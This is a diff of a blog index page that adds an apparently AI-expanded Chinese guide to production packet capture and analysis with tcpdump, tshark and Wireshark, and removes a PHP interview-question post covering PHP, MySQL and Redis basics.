@@ -184,6 +184,63 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2026/09/19/2026-09-19-expanded-blog-wireshark/">
+                [expanded] [blog] Wireshark
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2026-09-19</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="expanded-blog-Wireshark"><a href="#expanded-blog-Wireshark" class="headerlink" title="[expanded] [blog] Wireshark"></a>[expanded] [blog] Wireshark</h1><blockquote>
+<p>原始问题: [blog] Wireshark</p>
+</blockquote>
+<h1 id="Wireshark-网络抓包分析实战指南"><a href="#Wireshark-网络抓包分析实战指南" class="headerlink" title="Wireshark 网络抓包分析实战指南"></a>Wireshark 网络抓包分析实战指南</h1><h2 id="背景：为什么需要-Wireshark"><a href="#背景：为什么需要-Wireshark" class="headerlink" title="背景：为什么需要 Wireshark"></a>背景：为什么需要 Wireshark</h2><p>在生产环境中，网络问题往往是最难定位的故障类型之一。当应用层日志显示超时、连接重置或间歇性失败时，传统的应用监控无法揭示底层网络交互细节。典型场景包括：微服务间调用延迟突增但 APM 无法定位具体环节、数据库连接池频繁报错但 DB 侧无异常日志、负载均衡器后端健康检查失败但服务进程正常、跨云专线传输丢包但运营商声称链路正常。</p>
+<p>Wireshark 作为事实标准的网络协议分析工具，能够捕获并解析从数据链路层到应用层的完整报文。它不依赖应用程序的日志输出，直接从网卡驱动层获取原始数据包，这使得它能够发现 TCP 重传、乱序、窗口收缩、TLS 握手失败等应用层无法感知的底层问题。对于 SRE 而言，Wireshark 是验证网络假设、排除基础设施问题、为供应商提供确凿证据的关键工具。</p>
+<p>在容器化和服务网格环境中，Wireshark 的价值更加凸显。当流量经过多层代理（Envoy&#x2F;Nginx&#x2F;Istio）时，端到端的追踪往往失真，此时在关键节点抓包能够还原真实的网络行为，区分是应用逻辑问题还是网络栈问题。</p>
+<h2 id="诊断步骤：只读验证与抓包策略"><a href="#诊断步骤：只读验证与抓包策略" class="headerlink" title="诊断步骤：只读验证与抓包策略"></a>诊断步骤：只读验证与抓包策略</h2><p>在执行抓包前，必须先通过只读命令缩小问题范围，避免盲目抓包产生海量无用数据。首先使用 <code>ss -tanp</code> 或 <code>netstat -tanp</code> 确认连接状态，重点关注 ESTABLISHED、TIME_WAIT、CLOSE_WAIT 数量异常。检查 <code>ip -s link</code> 输出中的 RX&#x2F;TX errors、dropped、overruns 计数器，非零值通常指示硬件或驱动问题。</p>
+<p>使用 <code>tcpdump -D</code> 列出所有可用网络接口，确定需要监听的接口名称。在云环境中注意区分物理接口（eth0）、容器虚拟接口（veth）、隧道接口（tunl0）。执行 <code>tcpdump -i eth0 -c 10 -nn</code> 快速验证接口是否有流量，<code>-nn</code> 参数禁用 DNS 和端口名称解析以提升性能。</p>
+<p>对于高流量接口，必须设计精确的过滤器。使用 <code>tcpdump -i eth0 &#39;host 10.0.1.5 and port 3306&#39; -w /tmp/capture.pcap -C 100 -W 5</code> 进行环形缓冲抓包，<code>-C 100</code> 限制单文件 100MB，<code>-W 5</code> 保留最新 5 个文件，防止磁盘被填满。验证磁盘空间 <code>df -h /tmp</code> 确保至少有 10GB 可用空间。</p>
+<p>在生产环境抓包时，始终使用 BPF 过滤器而非事后过滤。错误示例：<code>tcpdump -i eth0 -w all.pcap</code> 然后用 Wireshark 过滤，这会导致 CPU 和 I&#x2F;O 压力。正确做法：<code>tcpdump -i eth0 &#39;tcp port 443 and (tcp[tcpflags] &amp; tcp-syn != 0)&#39; -w syn.pcap</code> 仅捕获 TLS 握手包。</p>
+<h2 id="核心操作：抓包与传输"><a href="#核心操作：抓包与传输" class="headerlink" title="核心操作：抓包与传输"></a>核心操作：抓包与传输</h2><p><strong>备份当前网络状态</strong>：在开始抓包前，保存当前连接表快照 <code>ss -tanp &gt; /var/log/netstat-$(date +%s).log</code>，记录接口统计 <code>ip -s link &gt; /var/log/ifstat-$(date +%s).log</code>，导出路由表 <code>ip route show table all &gt; /var/log/route-$(date +%s).log</code>。这些基线数据用于事后对比分析。</p>
+<p><strong>执行抓包命令</strong>：对于 HTTP&#x2F;HTTPS 流量分析，使用 <code>tcpdump -i any &#39;port 80 or port 443&#39; -s 0 -w http-$(hostname)-$(date +%Y%m%d-%H%M%S).pcap</code>。<code>-i any</code> 捕获所有接口（包括 lo），<code>-s 0</code> 捕获完整包而非默认的 262144 字节。对于数据库连接问题，使用 <code>tcpdump -i eth0 &#39;host db.example.com and tcp[13] &amp; 2 != 0&#39; -w db-syn.pcap</code> 仅捕获 SYN 包以分析连接建立过程。</p>
+<p><strong>安全传输到分析机</strong>：生产服务器通常无图形界面，需将 pcap 文件传输到本地。使用 <code>scp -C -l 8192 user@prod:/tmp/capture.pcap ./</code> 限速传输（8192 Kbit&#x2F;s），<code>-C</code> 启用压缩。对于大文件，先压缩 <code>gzip capture.pcap</code> 再传输。验证文件完整性 <code>md5sum capture.pcap.gz</code> 并在本地对比。</p>
+<p><strong>Wireshark 核心过滤器</strong>：打开 pcap 后，使用显示过滤器（Display Filter）而非捕获过滤器。分析 TCP 重传：<code>tcp.analysis.retransmission</code>；查找连接重置：<code>tcp.flags.reset == 1</code>；定位慢查询：<code>tcp.time_delta &gt; 1</code>；检查 TLS 握手失败：<code>ssl.alert_message</code>；追踪特定流：右键包选择 “Follow → TCP Stream”。</p>
+<h2 id="回滚与清理"><a href="#回滚与清理" class="headerlink" title="回滚与清理"></a>回滚与清理</h2><p>抓包操作本身无需回滚，但必须清理临时文件和恢复系统状态。停止长期运行的 tcpdump 进程：<code>pkill -SIGTERM tcpdump</code>，避免使用 <code>kill -9</code> 导致 pcap 文件损坏。验证进程已退出 <code>pgrep tcpdump</code> 返回空。</p>
+<p>清理抓包文件：<code>find /tmp -name &#39;*.pcap&#39; -mtime +7 -delete</code> 删除 7 天前的文件。对于环形缓冲抓包，tcpdump 会自动管理文件数量，但仍需定期清理：<code>ls -lh /tmp/capture*.pcap</code> 检查总大小，手动删除不再需要的文件。</p>
+<p>验证磁盘空间恢复：<code>df -h /tmp</code> 确认可用空间已释放。检查 inode 使用率 <code>df -i /tmp</code>，大量小 pcap 文件可能耗尽 inode。如果抓包期间修改了接口混杂模式，验证已恢复：<code>ip link show eth0 | grep PROMISC</code> 应无输出（tcpdump 退出后自动恢复）。</p>
+<p>对于在容器中抓包的场景，确保清理 nsenter 或 docker exec 创建的临时进程。使用 <code>docker top &lt;container&gt;</code> 检查容器内进程，确认无残留的 tcpdump。删除容器内的 pcap 文件以释放 overlay 存储空间。</p>
+<h2 id="常见陷阱与误判"><a href="#常见陷阱与误判" class="headerlink" title="常见陷阱与误判"></a>常见陷阱与误判</h2><p><strong>陷阱一：抓包位置错误</strong>。在负载均衡器后端抓包却看不到客户端真实 IP，因为 LB 做了 SNAT。必须在 LB 上抓包或启用 Proxy Protocol&#x2F;X-Forwarded-For。在容器内抓包看到的是 veth 接口流量，无法看到宿主机网络栈的处理，需在宿主机使用 <code>nsenter -t &lt;pid&gt; -n tcpdump</code> 进入容器网络命名空间。</p>
+<p><strong>陷阱二：时间戳误解</strong>。Wireshark 默认显示相对时间（从第一个包开始），导致误判延迟。必须设置 View → Time Display Format → UTC Date and Time of Day 使用绝对时间戳。抓包机器时钟偏移会导致时序分析错误，使用 <code>chronyc tracking</code> 验证 NTP 同步状态，System time offset 应小于 10ms。</p>
+<p><strong>陷阱三：TCP 校验和卸载</strong>。现代网卡启用 TCP Checksum Offload 后，Wireshark 显示校验和错误（红色标记）但实际包是正常的，因为校验和在网卡硬件计算而非内核。验证：<code>ethtool -k eth0 | grep tx-checksumming</code>，禁用以验证：<code>ethtool -K eth0 tx off</code>（仅用于测试，会降低性能）。</p>
+<p><strong>陷阱四：过滤器语法混淆</strong>。捕获过滤器（BPF）和显示过滤器（Wireshark）语法不同。<code>tcpdump &#39;tcp port 80&#39;</code> 正确，但 <code>tcpdump &#39;tcp.port == 80&#39;</code> 错误。Wireshark 中 <code>ip.addr == 10.0.0.1</code> 匹配源或目的，但 <code>ip.src == 10.0.0.1 or ip.dst == 10.0.0.1</code> 更明确。使用 <code>tcp.flags.syn == 1 and tcp.flags.ack == 0</code> 精确匹配 SYN 包，而非 <code>tcp[13] == 2</code>。</p>
+<p><strong>陷阱五：加密流量无法解析</strong>。TLS 1.3 使用 Perfect Forward Secrecy，即使有私钥也无法解密。必须在客户端设置 <code>SSLKEYLOGFILE</code> 环境变量导出会话密钥，然后在 Wireshark 中配置 Edit → Preferences → Protocols → TLS → (Pre)-Master-Secret log filename。对于 mTLS 场景，需要同时获取客户端和服务端的密钥日志。</p>
+<h2 id="架构层面的可观测性增强"><a href="#架构层面的可观测性增强" class="headerlink" title="架构层面的可观测性增强"></a>架构层面的可观测性增强</h2><p>将 Wireshark 分析集成到可观测性体系需要自动化和标准化。在关键节点（API Gateway、数据库代理、跨 AZ 边界）部署持续抓包，使用 <code>tcpdump -G 3600 -w /data/pcap/%Y%m%d-%H%M%S.pcap</code> 每小时轮转文件，保留 7 天用于事后分析。结合 Prometheus 的 <code>node_network_receive_drop_total</code> 指标，当丢包率超过阈值时自动触发详细抓包。</p>
+<p>在灰度发布期间，对 canary 实例和 baseline 实例同时抓包，使用 <code>tshark -r canary.pcap -q -z io,stat,1</code> 生成每秒统计，对比 TCP 重传率、平均 RTT、连接建立时间。将这些指标纳入 SLO 判断：如果 canary 的 P99 连接时间比 baseline 高 20%，自动回滚。</p>
+<p>对于多租户环境，使用 eBPF（如 Cilium）在内核层面标记流量，然后在 Wireshark 中通过 VLAN ID 或自定义 metadata 过滤特定租户的流量。这避免了在共享基础设施上抓取所有流量的隐私和性能问题。定期使用 <code>capinfos *.pcap</code> 生成统计报告，识别异常流量模式（如突发的大包、异常的协议分布）。</p>
+<p>建立 pcap 文件的中心化存储和检索系统。使用 <code>editcap -c 10000 large.pcap split.pcap</code> 将大文件分割，上传到对象存储（S3&#x2F;OSS），并在 Elasticsearch 中索引元数据（时间范围、源&#x2F;目的 IP、协议类型）。当工程师报告问题时，可通过 Kibana 查询相关时间段的 pcap 文件，而无需登录生产服务器。</p>
+<h2 id="参考-Runbook"><a href="#参考-Runbook" class="headerlink" title="参考 Runbook"></a>参考 Runbook</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 快速诊断连接问题</span></span><br><span class="line">ss -tanp | grep ESTAB | <span class="built_in">wc</span> -l  <span class="comment"># 当前连接数</span></span><br><span class="line">ss -s  <span class="comment"># 连接状态汇总</span></span><br><span class="line">ip -s <span class="built_in">link</span> show eth0  <span class="comment"># 接口错误统计</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 精确抓包模板</span></span><br><span class="line">tcpdump -i eth0 <span class="string">&#x27;host 10.0.1.5 and tcp port 3306&#x27;</span> -w db.pcap -C 50 -W 10</span><br><span class="line">tcpdump -i any <span class="string">&#x27;tcp[tcpflags] &amp; (tcp-syn|tcp-fin) != 0&#x27;</span> -w handshake.pcap</span><br><span class="line">tcpdump -i eth0 <span class="string">&#x27;icmp or (tcp and (tcp[tcpflags] &amp; tcp-rst != 0))&#x27;</span> -w errors.pcap</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wireshark 命令行分析</span></span><br><span class="line">tshark -r capture.pcap -q -z io,phs  <span class="comment"># 协议层次统计</span></span><br><span class="line">tshark -r capture.pcap -Y <span class="string">&#x27;tcp.analysis.retransmission&#x27;</span> -T fields -e frame.number -e ip.src -e ip.dst</span><br><span class="line">tshark -r capture.pcap -q -z conv,tcp  <span class="comment"># TCP 会话统计</span></span><br><span class="line">tshark -r capture.pcap -Y <span class="string">&#x27;http.request.method == &quot;POST&quot;&#x27;</span> -T json &gt; requests.json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 性能分析</span></span><br><span class="line">tshark -r capture.pcap -q -z io,<span class="built_in">stat</span>,1,<span class="string">&quot;AVG(tcp.time_delta)tcp.time_delta&quot;</span>  <span class="comment"># 每秒平均延迟</span></span><br><span class="line">tshark -r capture.pcap -Y <span class="string">&#x27;tcp.analysis.ack_rtt &gt; 0.1&#x27;</span> -T fields -e tcp.analysis.ack_rtt -e ip.dst</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件管理</span></span><br><span class="line">capinfos capture.pcap  <span class="comment"># 文件统计信息</span></span><br><span class="line">mergecap -w merged.pcap file1.pcap file2.pcap  <span class="comment"># 合并多个文件</span></span><br><span class="line">editcap -A <span class="string">&#x27;2024-01-01 10:00:00&#x27;</span> -B <span class="string">&#x27;2024-01-01 11:00:00&#x27;</span> input.pcap output.pcap  <span class="comment"># 时间切片</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><em>by claude-sonnet-5 nightly expand · 2026-09-19</em></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2026/09/19/2026-09-19-expanded-blog-xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/">
                 [expanded] [blog] XSS跨站脚本攻击
             </a>
@@ -643,445 +700,8 @@ _by claude-sonnet-5 nightly expand · 2026-09-19_
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2026/09/19/php-interview/">
-                PHP 面试题
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2026-09-19</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/面试/">面试</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <ul>
-<li><a href="#1">PHP</a><ul>
-<li><a href="#1.1">运行模式</a></li>
-<li><a href="#1.2">Nginx与Apache解析php文件</a></li>
-<li><a href="#1.3">设计模式</a></li>
-<li><a href="#1.4">Session与Cookie</a></li>
-<li><a href="#1.5">闭包</a></li>
-<li><a href="#1.6">单双引号区别</a></li>
-<li><a href="#1.7">include和require的区别</a></li>
-</ul>
-</li>
-<li><a href="#2">PHP优化与高并发</a><ul>
-<li><a href="#2.1">优化方案</a></li>
-<li><a href="#2.2">PSR-4代码规范</a></li>
-<li><a href="#2.3">微服务</a></li>
-<li><a href="#2.4">抽象类与接口区别</a></li>
-<li><a href="#2.5">垃圾回收机制</a></li>
-<li><a href="#2.6">高并发优化</a></li>
-</ul>
-</li>
-<li><a href="#3">Mysql</a><ul>
-<li><a href="#3.1">myisam和innodb区别以及事务四大特性</a></li>
-<li><a href="#3.2">mysql索引</a></li>
-<li><a href="#3.3">主从-分库分表-锁</a></li>
-<li><a href="#3.4">如何定位慢查询</a></li>
-</ul>
-</li>
-<li><a href="#4">MongoDB</a> </li>
-<li><a href="#5">Redis</a><ul>
-<li><a href="#5.1">Redis和Memcache区别</a></li>
-<li><a href="#5.2">Redis常见数据结构</a></li>
-<li><a href="#5.3">Redis缓存雪崩、缓存穿透、缓存击穿</a></li>
-<li><a href="#5.4">Redis淘汰策略</a> </li>
-<li><a href="#5.5">Redis分布式锁怎么实现</a></li>
-<li><a href="#5.6">Redis的持久化机制:RDB-vs-AOF</a></li>
-<li><a href="#5.7">Redis主从哨兵和集群的区别</a></li>
-<li><a href="#5.8">节点扩容不同</a></li>
-</ul>
-</li>
-<li><a href="#6">MQ</a><ul>
-<li><a href="#6.1">RabbitMQ,RocketMQ,Kafka区别</a></li>
-</ul>
-</li>
-<li><a href="#7">服务器&amp;其它方面</a>  <ul>
-<li><a href="#7.1">swoole</a></li>
-<li><a href="#7.2">phpunit</a></li>
-<li><a href="#7.3">php-cs-fixer</a></li>
-<li><a href="#7.4">docker多版本启动共用</a></li>
-</ul>
-</li>
-</ul>
-<h2 id="php面试题"><a href="#php面试题" class="headerlink" title="php面试题"></a>php面试题</h2><h3 id="1">PHP</h3>
-<h4 id="1.1">运行模式</h4>
-
-
-<ul>
-<li>CGI（通用网关接口&#x2F; Common Gateway Interface）</li>
-<li>FastCGI（常驻型CGI &#x2F; Long-Live CGI）lamp</li>
-<li>CLI（命令行运行 &#x2F; Command Line Interface）</li>
-<li>Web模块模式（Apache等Web服务器运行的模式）</li>
-<li>ISAPI（Internet Server Application Program Interface）</li>
-</ul>
-<h4 id="1.2">Nginx与Apache解析php文件</h4>
-
-<ul>
-<li>php是apache的一个模块，必须依靠web服务器才可以运行，在php引擎解析php文件，php引擎将html页面带给web服务器解析并返回客户端</li>
-<li>cgi与fastcgi协议，CGI common gateway interface, CGI缺点，每处理一个请求都要fork一个全新的进程，就有了fastCGI，一个进程内可以处理多个请求</li>
-<li>phpCGI是fastCGI管理器，后面就用了FPM已经集成到了php里(php-fpm进程管理)</li>
-<li>php-fpm监听的事socket文件，nginx通过location将所有php文件交给fpm处理</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">default.conf</span><br><span class="line">location ~ |.php<span class="variable">$&#123;</span></span><br><span class="line"><span class="variable">	include fastcgi_params</span></span><br><span class="line"><span class="variable">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="1.3"><a rel="https://refactoringguru.cn/design-patterns/php">设计模式（三大类）</a></h4>
-
-<ul>
-<li>创建型模式共五种：工厂方法模式、抽象工厂模式、单例模式、建造者模式、原型模式。</li>
-<li>结构型模式共七种：适配器模式、装饰器模式、代理模式、外观模式、桥接模式、组合模式、享元模式</li>
-<li>行为型模式共十一种：策略模式、模板方法模式、观察者模式、迭代子模式、责任链模式、命令模式、备忘录模式、状态模式、访问者模式、中介者模式、解释器模式</li>
-</ul>
-<h4 id="1.4">Session与Cookie</h4>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cookie 客户端，保存用户信息的一种机制，</span><br><span class="line">Session 服务端，跟踪用户状态，保存用户会话</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有效期上不同</span></span><br><span class="line">Cookie  开发可以通过设置cookie的属性，达到使cookie长期有效的效果。</span><br><span class="line">Session  session依赖于名为JSESSIONID的cookie，而cookie JSESSIONID的过期时间默认为-1，只需关闭窗口该session就会失效，因而session不能达到长期有效的效果</span><br><span class="line"></span><br><span class="line"><span class="comment"># 跨域</span></span><br><span class="line">cookie 支持跨域名访问。</span><br><span class="line">session 不支持跨域名访问。</span><br><span class="line"></span><br><span class="line"><span class="comment"># 什么是CSRF攻击，XSS攻击</span></span><br><span class="line">CSRF （Cross-site request forgery）跨站请求伪造,黑客建立一个伪造网站或发送邮箱带了一个正常URL链接来让正常用户访问，来让正常用户让自己浏览器里的COOKIE权限来执行一些非法请求，</span><br><span class="line">如转账，提权等操作</span><br><span class="line">!! 防范方法有，验证 HTTP Referer 字段；在请求地址中添加 token 并验证</span><br><span class="line"></span><br><span class="line">XSS 主要将XSS代码提交存储在服务器端（数据库，内存，文件系统等），下次请求目标页面时不用再提交XSS代码。当目标用户访问该页面获取数据时，XSS代码会从服务器解析之后加载出来，返回到浏览器做正常的HTML和JS解析执行，XSS攻击就发生了</span><br><span class="line">!! 防范方法:通过过滤是针对非法的HTML代码包括单双引号等，使用htmlspecialchars()函数</span><br></pre></td></tr></table></figure>
-
-<h4 id="1.5">闭包</h4>
-内部函数可以访问外部函数
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">init</span></span>() &#123;</span><br><span class="line">  var name = <span class="string">&quot;Mozilla&quot;</span>; // name 是一个被 init 创建的局部变量</span><br><span class="line">  <span class="keyword">function</span> <span class="function"><span class="title">displayName</span></span>() &#123;</span><br><span class="line">    // displayName() 是内部函数，一个闭包</span><br><span class="line">    alert(name); // 使用了父函数中声明的变量</span><br><span class="line">  &#125;</span><br><span class="line">  displayName();</span><br><span class="line">&#125;</span><br><span class="line">init();</span><br></pre></td></tr></table></figure>
-
-<h4 id="1.6">双引号和单引号的区别</h4>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">“<span class="variable">$aaa</span>” 解释变量</span><br><span class="line">‘<span class="variable">$ccc</span>’ 不解释变量</span><br></pre></td></tr></table></figure>
-<h4 id="1.7">include和require的区别</h4>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">require 首先执行，报错会终止程序</span><br><span class="line">include 如果包含的，报错会提示，继续执行下去</span><br></pre></td></tr></table></figure>
-<h3 id="2">PHP优化与高并发</h3>
-<h4 id="2.1">优化方案</h4>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="built_in">unset</span>(); <span class="comment"># 注销那些不用的变量尤其是大数组，以便释放内存</span></span><br><span class="line">2. str_replace函数比preg_replace函数快，但strtr函数的效率是str_replace函数的四倍</span><br><span class="line">3. 尽量不要在<span class="keyword">for</span>循环中使用函数，比如<span class="keyword">for</span> (<span class="variable">$x</span>=0; <span class="variable">$x</span> &lt; count(<span class="variable">$array</span>); <span class="variable">$x</span>)每循环一次都会调用count()函数</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="2.2">PSR-4代码规范</h4>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">composer如何实现？PSR-4是什么?</span><br><span class="line">1. 自动加载有两种方式（都是php内置的），一种是通过__autoload(),另一种是通过spl_autoload_register()。</span><br><span class="line"></span><br><span class="line">2.PSR是PHP Standards Recommendation的简称,制定的代码规范，简称PSR，是代码开发的事实标准</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="2.3">抽象类与接口区别</h4>
-
-
-<table>
-<thead>
-<tr>
-<th>特性</th>
-<th>抽象类</th>
-<th>接口</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>用于声明某一种事物，规范名称、参数，形成模块，未有详细的实现细节</td>
-<td>✅</td>
-<td>✅</td>
-</tr>
-<tr>
-<td>通过类来实现相关的细节工作</td>
-<td>✅</td>
-<td>✅</td>
-</tr>
-<tr>
-<td>抽象类的抽象方法与接口一样</td>
-<td>✅</td>
-<td>✅</td>
-</tr>
-<tr>
-<td>可继承</td>
-<td>✅</td>
-<td>✅</td>
-</tr>
-<tr>
-<td>有属性、普通方法、抽象方法</td>
-<td>✅</td>
-<td>❌只有常量</td>
-</tr>
-<tr>
-<td>抽象方法</td>
-<td>❌不一定要有抽象方法</td>
-<td>✅</td>
-</tr>
-<tr>
-<td>语法不同</td>
-<td>❌</td>
-<td>❌</td>
-</tr>
-<tr>
-<td>声明不同</td>
-<td>abstract关键字在类前声明，且有class声明为类</td>
-<td>用interface来声明，但不能用class来声明</td>
-</tr>
-<tr>
-<td>继承</td>
-<td>extends关键字让子类继承父类后，在子类实现详细的抽象方法</td>
-<td>用implements让普通类在类里实现接口的详细方法，且接口可以一次性实现多个方法，用逗号分开各个接口就可</td>
-</tr>
-</tbody></table>
-<p>抽象类与接口的结合</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">/* </span><br><span class="line">写此程序源于自己的猜测，想在抽象类里实现某一接口。 </span><br><span class="line">*/ </span><br><span class="line">interface work&#123; </span><br><span class="line">  public <span class="keyword">function</span> say(); </span><br><span class="line">&#125;</span><br><span class="line">abstract class a implements work&#123; </span><br><span class="line">  public <span class="keyword">function</span> <span class="function"><span class="title">showlove</span></span>()&#123; </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;love you&lt;br / &#x27;</span>; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">class b extends a&#123; </span><br><span class="line">  public <span class="keyword">function</span> <span class="function"><span class="title">say</span></span>()&#123; </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;hello, i m in b&#x27;</span>; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$k</span>=new b(); </span><br><span class="line"><span class="variable">$k</span>- say();</span><br><span class="line">/* </span><br><span class="line">以上程序能正常执行</span><br><span class="line">普通类implements接口后，就变成了抽象类了，这就好像是直接给抽象类增加了一个抽象方法。</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
-
-<p>接口与继承的结合</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">interface kk&#123; </span><br><span class="line">  public <span class="keyword">function</span> say(); </span><br><span class="line">&#125;</span><br><span class="line">class a &#123; </span><br><span class="line">  public <span class="keyword">function</span> <span class="function"><span class="title">show</span></span>()&#123; </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;我是父类&lt;br / &#x27;</span>; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">class b extends a implements kk&#123; </span><br><span class="line">  public <span class="keyword">function</span> <span class="function"><span class="title">say</span></span>()&#123; </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;我是继承A类，同时实现say接口的&lt;br / &#x27;</span>; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=new b(); </span><br><span class="line"><span class="variable">$b</span>- show();//我是父类</span><br><span class="line"><span class="variable">$b</span>- say();//我是继承A类，同时实现say接口的</span><br></pre></td></tr></table></figure>
-
-<h4 id="2.4">微服务</h4>
-
-<p>优势：</p>
-<ul>
-<li>独立开发 – 所有微服务都可以根据各自的功能轻松开发</li>
-<li>独立部署 – 基于其服务，可以在任何应用程序中单独部署它们</li>
-<li>故障隔离 – 即使应用程序的一项服务不起作用，系统仍可继续运行</li>
-<li>混合技术堆栈 – 可以使用不同的语言和技术来构建同一应用程序的不同服务</li>
-<li>粒度缩放 – 单个组件可根据需要进行缩放，无需将所有组件缩放在一起</li>
-</ul>
-<p>特点：</p>
-<ul>
-<li>解耦 – 系统内的服务很大程度上是分离的。因此，整个应用程序可以轻松构建，更改和扩展</li>
-<li>组件化 – 微服务被视为可以轻松更换和升级的独立组件</li>
-<li>业务能力 – 微服务非常简单，专注于单一功能</li>
-<li>自治 – 开发人员和团队可以彼此独立工作，从而提高速度</li>
-<li>持续交付 – 通过软件创建，测试和批准的系统自动化，允许频繁发布软件</li>
-<li>责任 – 微服务不关注应用程序作为项目。相反，他们将应用程序视为他们负责的产品</li>
-<li>分散治理 – 重点是使用正确的工具来做正确的工作。这意味着没有标准化模式或任何技术模式。开发人员可以自由选择最有用的工具来解决他们的问题</li>
-<li>敏捷 – 微服务支持敏捷开发。任何新功能都可以快速开发并再次丢弃</li>
-</ul>
-<h4 id="2.5">垃圾回收机制</h4>
-
-<ul>
-<li>PHP垃圾回收机制</li>
-</ul>
-<p><code>PHP5.3版本</code>之前,使用的垃圾回收机制是单纯的“引用计数”<br>但是当两个或多个对象互相引用形成环状后，内存对象的计数器则不会消减为0,<br>这一组内存对象已经没用了，但是不能回收，从而导致内存泄露的现象<br>每个php变量存在一个叫”zval”的变量容器中。一个zval变量容器，除了包含变量的类型和值</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xdebug_debug_zval( <span class="string">&#x27;a&#x27;</span> ); <span class="comment"># Xdebug来检查引用计数情况</span></span><br></pre></td></tr></table></figure>
